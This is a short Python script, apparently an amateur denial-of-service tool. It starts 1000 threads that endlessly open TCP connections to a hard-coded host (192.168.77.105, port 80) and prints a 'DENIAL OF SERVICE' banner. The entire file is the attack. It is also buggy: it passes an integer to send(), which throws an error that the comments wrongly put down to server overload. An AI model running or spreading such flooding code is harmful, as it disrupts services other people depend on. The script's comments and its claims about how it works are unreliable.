import socket
import random
import threading

ip="192.168.77.105"
port =80
thread=1000
count = 0

def start():

    global count
    while True:
        try:
            s= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect((ip,port))
            print("-----------connected---------")

            s.send(1000000)
            # it is trying to connecting to that port  but due to heavy connection alreadyy it cant able to connection so it is a eroor
            #any error happen means it will give control flow to except block so this control goes there and
        except:
            s.close()
            print("******-------+++++++DENIAL OF SERVICE ++++++----******")


for i in range(thread):
    thred = threading.Thread(target=start)
    thred.start()